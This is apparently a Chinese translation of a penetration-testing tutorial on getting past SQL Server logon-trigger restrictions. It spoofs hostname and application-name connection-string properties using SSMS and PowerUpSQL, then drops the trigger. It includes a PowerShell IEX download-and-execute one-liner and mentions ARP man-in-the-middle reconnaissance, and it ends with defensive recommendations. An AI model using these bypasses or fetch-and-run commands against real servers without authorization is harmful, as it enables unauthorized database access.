> 原文链接: https://www.anquanke.com//post/id/150021 


# SQL Server 登录触发器限制绕过


                                阅读量   
                                **107495**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Scott Sutherland，文章来源：blog.netspi.com
                                <br>原文地址：[https://blog.netspi.com/bypass-sql-logon-triggers/](https://blog.netspi.com/bypass-sql-logon-triggers/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t011c3be78ca1ec2973.jpg)](https://p1.ssl.qhimg.com/t011c3be78ca1ec2973.jpg)

## 前言

对于我们来说，对直接连接到SQL Server数据库的应用进行渗透测试是非常常见的。我们偶尔会遇到一个这样的SQL Server后端，它只允许来自预定义的主机或应用程序的连接。通常这些类型的限制是通过登录触发器强制执行的。本文我将展示如何通过使用连接字符串属性欺骗主机名和应用程序名称来绕过这些限制。这些示例将包括SSMS和PowerUpSQL。对于需要应对旧应用的渗透测试人员和开发人员来说，这应该是很有用的。



## 什么是登录触发器(Logon Trigger)

[登录触发器](https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers?view=sql-server-2017)本质上是一个存储过程，在成功验证到SQL Server之后，但在登录会话完全建立之前执行。它们通常用于根据一天中的时间、主机名、应用程序名称和单个用户并发会话的数量限制对SQL Server的访问。



## 安装SQL Server

如果尚未安装SQL Server，可以使用以下几个资源：
1. 从[这里](https://www.microsoft.com/en-us/sql-server/sql-server-editions-express)下载并安装SQL Server。
1. 从[这里](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-2017)下载并安装SQLServerManagementStudioExpress(SSMS)。


## 创建登录触发器以限制主机名

以下是设置触发器的说明，该触发器基于连接的工作站名称来限制访问。
1. 使用SSMS以系统管理员身份登录新的SQL Server实例。
<li>首先，让我们使用下面的命令查看连接到SQL Server实例的工作站的名称。默认情况下，它应该使用连接到SQL Server实例的工作站的主机名。
<pre><code class="hljs nginx"> SELECT HOST_NAME()
</code></pre>
[![](https://p2.ssl.qhimg.com/t01f8a1888d88cda9d0.png)](https://p2.ssl.qhimg.com/t01f8a1888d88cda9d0.png)
</li>
<li>创建一个登录触发器，限制对特定主机名的访问。按如下所示执行触发器。
<pre><code class="hljs sql"> -- Create our logon trigger
 CREATE TRIGGER MyHostsOnly
 ON ALL SERVER
 FOR LOGON
 AS
 BEGIN
     IF
     (
         -- White list of allowed hostnames are defined here.
         HOST_NAME() NOT IN ('ProdBox','QaBox','DevBox','UserBox')
     )
     BEGIN
         RAISERROR('You are not allowed to login', 16, 1);
         ROLLBACK;
     END 
 END
</code></pre>
[![](https://p0.ssl.qhimg.com/t01f79968983f376356.png)](https://p0.ssl.qhimg.com/t01f79968983f376356.png)
</li>
<li>设置登录触发器后，当再次尝试使用SSMS登录时，应该会收到如下所示的错误，因为你是从列表中没有的主机名进行连接的。<br>[![](https://p3.ssl.qhimg.com/t012f5b56cc938c5043.png)](https://p3.ssl.qhimg.com/t012f5b56cc938c5043.png)
</li>
你可能会问，“我什么时候才能真正实际使用这个工具？”通常是在我们从配置文件或反编译代码中恢复连接字符串之后，现在我们希望使用这些信息直接连接到SQL Server。在应用渗透测试期间，这是一个非常常见的场景，但是在网络渗透测试和红队参与期间，我们还可以在打开的文件共享中找到内部应用程序和配置文件。



## 使用SSMS欺骗主机名
<li>在SSMS中打开“Connect Object Explorer”并选择options -&gt; “Additional Connection Parameters”。这里你可以动态地设置连接字符串属性。作为例子，我们将“Workstation ID”属性设置为“DevBox”，这是我们所知道的白名单中的主机名。注意：稍后我将介绍几种识别白名单主机名的方法。<br>[![](https://p4.ssl.qhimg.com/t014db79608246e54d0.png)](https://p4.ssl.qhimg.com/t014db79608246e54d0.png)
</li>
<li>点击登录。如果打开查询窗口并再次检查主机名，则应返回“DevBox”。这进一步说明我们成功地欺骗了主机名。
<pre><code class="hljs nginx"> SELECT HOST_NAME()
</code></pre>
[![](https://p3.ssl.qhimg.com/t0121241bf970fbc201.png)](https://p3.ssl.qhimg.com/t0121241bf970fbc201.png)
</li>


## 使用连接字符串欺骗主机名

SSMS只是用我们的“workstation id”属性集构建一个连接字符串。下面是一个简单的连接字符串示例，该字符串将作为当前Windows用户连接到远程SQL Server实例，并选择“Master”数据库。

```
Data Source=serverinstance1;Initial Catalog=Master;Integrated Security=True;
```

如果我们在上一节中展示的登录触发器已经实现，我们应该会看到“failed to connect”提示。但是，如果将“WorkStation ID”属性设置为允许的主机名，则将成功登录。

```
Data Source=serverinstance1;Initial Catalog=Master;Integrated Security=True;Workstation ID = DevBox;
```



## 使用PowerUpSQL欺骗主机名

我还向PowerUpSQL的Get-SQLQuery函数添加了“WorkstationId”选项。如果有时间我将改进其他功能。现在，下面是一个示例，展示了如何绕过我们在上一节中创建的登录触发器。
<li>打开Powershell并通过你喜欢的方法加载PowerUpSQL。下面的示例演示如何直接从GitHub加载它。
<pre><code class="hljs javascript"> IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")
</code></pre>
</li>
<li>初始连接由于触发器限制而失败。请注意，需要设置“-ReturnError”来查看服务器返回的错误。
<pre><code class="hljs apache"> Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -Query "SELECT host_name()" -ReturnError
</code></pre>
[![](https://p5.ssl.qhimg.com/t019b68a03eff1d7452.png)](https://p5.ssl.qhimg.com/t019b68a03eff1d7452.png)
</li>
<li>现在将workStationid选项设置为“DevBox”，应该能够成功地执行查询。
<pre><code class="hljs apache"> Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -Query "SELECT host_name()" -WorkstationId "DevBox"
</code></pre>
[![](https://p2.ssl.qhimg.com/t01b1b364804244f6c9.png)](https://p2.ssl.qhimg.com/t01b1b364804244f6c9.png)
</li>
<li>要删除触发器，可以使用下面的命令。
<pre><code class="hljs sql"> Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -WorkstationId "DevBox" -Query 'DROP TRIGGER MyHostsOnly on all server'
</code></pre>
</li>


## 创建登录触发器以限制应用程序

以下是设置触发器的说明，该触发器根据连接应用程序名称限制访问。
1. 使用SSMS以系统管理员身份登录新的SQLServer实例。
<li>首先，让我们使用下面的命令查看连接到SQLServer实例的应用程序的名称。它应该返回“Microsoft SQL Server Management Studio – Query”。
<pre><code class="hljs nginx"> SELECT APP_NAME()
</code></pre>
[![](https://p1.ssl.qhimg.com/t013dde4bacc1f1ff00.png)](https://p1.ssl.qhimg.com/t013dde4bacc1f1ff00.png)
</li>
<li>创建限制访问特定应用程序的登录触发器。按如下所示执行触发器。
<pre><code class="hljs sql"> CREATE TRIGGER MyAppsOnly
 ON ALL SERVER
 FOR LOGON
 AS
 BEGIN
 IF
 (
 ------ Set the white list of application names here
 APP_NAME() NOT IN ('Application1','Application2','SuperApp3000','LegacyApp','DevApp1')
 )
 BEGIN
 RAISERROR('You cannot connect to SQL Server from this machine', 16, 1);
 ROLLBACK;
 END
 END
</code></pre>
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013b1bfa067c773938.png)
</li>
<li>设置登录触发器后，当再次尝试使用SSMS登录时，应该会收到如下所示的错误，因为你正在从一个不在列表中的应用程序进行连接。<br>[![](https://p2.ssl.qhimg.com/t012f5b56cc938c5043.png)](https://p2.ssl.qhimg.com/t012f5b56cc938c5043.png)
</li>
再一次，你可能会问，“我什么时候才能真正实际使用它？”一些应用程序把名称静态设置在用于连接到SQL Server的连接字符串中。实际上，很少看到登录触发器按应用程序名称限制访问，但我们已经见过几次了。



## 使用SSMS欺骗应用程序名称
<li>在SSMS中打开“Connect Object Explorer”并选择options -&gt; “Additional Connection Parameters”。在这里你可以动态地设置连接字符串属性。我们把“application name/应用程序名称”属性设置为“SuperApp3000”，这是一个白名单中的应用程序名称。<br>[![](https://p1.ssl.qhimg.com/t01eb9892fe616b4e8f.png)](https://p1.ssl.qhimg.com/t01eb9892fe616b4e8f.png)
</li>
<li>登录。如果你打开一个查询窗口并再次检查您的应用程序名称，它应该返回“SuperApp3000”。这说明我们成功地欺骗了主机名。
<pre><code class="hljs nginx"> SELECT APP_NAME()
</code></pre>
[![](https://p4.ssl.qhimg.com/t0172e94fbd167d688a.png)](https://p4.ssl.qhimg.com/t0172e94fbd167d688a.png)
</li>


## 使用连接字符串欺骗应用程序名称

正如我在上一节中提到的，应用程序可以使用名为“AppName”的连接字符串属性向SQL Server声明其应用程序名称。下面是示例。

```
Data Source=serverinstance1;Initial Catalog=Master;Integrated Security=True;  Application Name =MyApp"
Data Source=serverinstance1;Initial Catalog=Master;Integrated Security=True;  ApplicationName =MyApp"
Data Source=serverinstance1;Initial Catalog=Master;Integrated Security=True;  AppName =MyApp"

```



## 使用PowerUpSQL欺骗应用程序名称

为了演示，我已经更新了PowerUpSQL的Get-SQLQuery函数，包含了“appname”选项。下面是一个基本的例子。
<li>打开Powershell并通过你喜欢的方法加载PowerUpSQL。下面的示例演示如何直接从GitHub加载。
<pre><code class="hljs javascript">IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")
</code></pre>
</li>
<li>PowerUpSQL函数封装.NET SQL Server函数。使用.NET连接到SQLServer时，“appname”属性默认设置为“..Net SqlClient Data Provider”。但是，由于我们创建了一个新的登录触发器，它通过“appname”来限制访问，我们应该会得到以下错误。
<pre><code class="hljs apache"> Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -Query "SELECT app_name()" -ReturnError
</code></pre>
[![](https://p4.ssl.qhimg.com/t01606f099a444d2689.png)](https://p4.ssl.qhimg.com/t01606f099a444d2689.png)
</li>
<li>现在将“appname”属性设置为“SuperApp3000”，应该能够成功执行查询。
<pre><code class="hljs apache"> Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -Query "SELECT app_name()" -AppName SuperApp3000
</code></pre>
[![](https://p1.ssl.qhimg.com/t01f06b145dd831af08.png)](https://p1.ssl.qhimg.com/t01f06b145dd831af08.png)
</li>
<li>要删除触发器，可以使用下面的命令。
<pre><code class="hljs sql">Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -AppName SuperApp3000 -Query 'DROP TRIGGER MyAppsOnly on all server'
</code></pre>
</li>
<li>现在可以连接了，不需要欺骗应用程序名称。
<pre><code class="hljs bash"> Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014  -Query 'SELECT APP_NAME()'
</code></pre>
[![](https://p3.ssl.qhimg.com/t0173df813727f35db7.png)](https://p3.ssl.qhimg.com/t0173df813727f35db7.png)
</li>
<li>或者，也可以用任何应用程序名称。
<pre><code class="hljs bash"> Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -AppName EvilClient -Query 'SELECT APP_NAME()'
</code></pre>
[![](https://p1.ssl.qhimg.com/t01c781cd8f1bb78544.png)](https://p1.ssl.qhimg.com/t01c781cd8f1bb78544.png)
</li>


## 查找白名单主机名和应用程序名称

如果不确定登录触发器的白名单中有哪些主机名和应用程序，下面是一些发现这些主机名和应用程序的选项。

### <a class="reference-link" name="1.%20%E6%A3%80%E6%9F%A5%E7%99%BB%E5%BD%95%E8%A7%A6%E5%8F%91%E5%99%A8%E6%BA%90%E4%BB%A3%E7%A0%81"></a>1. 检查登录触发器源代码

要获得登录触发器列出的主机名和应用程序的完整列表，最好的方法是检查源代码。然而，在大多数情况下，这需要访问权限。

```
SELECT    name,
OBJECT_DEFINITION(OBJECT_ID) as trigger_definition,
parent_class_desc,
create_date,
modify_date,
is_ms_shipped,
is_disabled
FROM sys.server_triggers  
ORDER BY name ASC
```

[![](https://p4.ssl.qhimg.com/t01133c7adaf3d7f8b7.png)](https://p4.ssl.qhimg.com/t01133c7adaf3d7f8b7.png)

### <a class="reference-link" name="2.%20%E6%A3%80%E6%9F%A5%E7%A1%AC%E7%BC%96%E7%A0%81%E5%80%BC%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%A0%81"></a>2. 检查硬编码值的应用程序代码

有时候所允许的主机名和应用程序被硬编码到应用程序中。如果你正在处理.NET或Java应用程序，则可以对源代码进行反编译并检查与它们正在使用的连接字符串相关的关键字。这个方法假定你可以访问应用程序集或配置文件。[JD-GUI](http://jd.benow.ca/)和[DNSPY](https://github.com/0xd4d/dnSpy)可以派上用场。

### <a class="reference-link" name="3.%20%E6%A3%80%E6%B5%8B%E5%BA%94%E7%94%A8%E6%B5%81%E9%87%8F"></a>3. 检测应用流量

有时候，当应用程序启动时，从数据库服务器获取所允许的主机名和应用程序。因此，你可以使用嗅探器来获取列表。我经历过几次。

### <a class="reference-link" name="4.%20%E4%BD%BF%E7%94%A8%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F%E5%88%97%E8%A1%A8"></a>4. 使用域名系统列表

如果你已经有域名账户，则可以查询Active Directory以获得域名列表。然后循环访问该列表，直到遇到一个允许连接的列表。这假定当前域用户具有登录到SQL Server的权限，并且白名单上的主机名与该域相关联。

### <a class="reference-link" name="5.%20%E4%BD%BF%E7%94%A8MITM%E6%9D%A5%E5%AD%98%E5%82%A8%E8%BF%9E%E6%8E%A5"></a>5. 使用MITM来存储连接

你还可以执行基于ARP的标准中间人(MITM)攻击，以拦截远程系统到SQL Server的连接。如果连接已加密，将看不到通信内容，但能够看到哪些主机正在连接。当然，也可以使用MITM技术。

注意：如果正在进行证书验证，可能会导致数据包丢失并对生产系统产生影响，因此请谨慎使用该方法。



## 一般性建议
- 不要根据客户端容易更改的信息使用登录触发器来限制对SQL Server的访问。
- 如果希望限制对允许的系统列表的访问，请考虑使用网络或主机级防火墙规则，而不是登录触发器。
- 考虑根据用户组和分配的权限限制对SQL Server的访问，而不是使用登录触发器。


## 结束

本文我介绍了几种利用连接字符串属性来绕过由SQL Server登录触发器强制执行的访问限制的方法。如果你必须对旧桌面应用程序执行渗透测试，希望这将是有用的。对于那些感兴趣的人，我还在这里更新了“[SQL Server连接字符串CheatSheet](https://gist.github.com/nullbind/91c573b0e27682733f97d4e6eebe36f8)”。



## 引用
- [https://gist.github.com/nullbind/91c573b0e27682733f97d4e6eebe36f8](https://gist.github.com/nullbind/91c573b0e27682733f97d4e6eebe36f8)
- [https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers?view=sql-server-2017](https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers?view=sql-server-2017)
- [https://blog.sqlauthority.com/2018/04/14/sql-server-be-careful-with-logon-triggers-dont-use-host_name/](https://blog.sqlauthority.com/2018/04/14/sql-server-be-careful-with-logon-triggers-dont-use-host_name/)
审核人：yiwang   编辑：边边
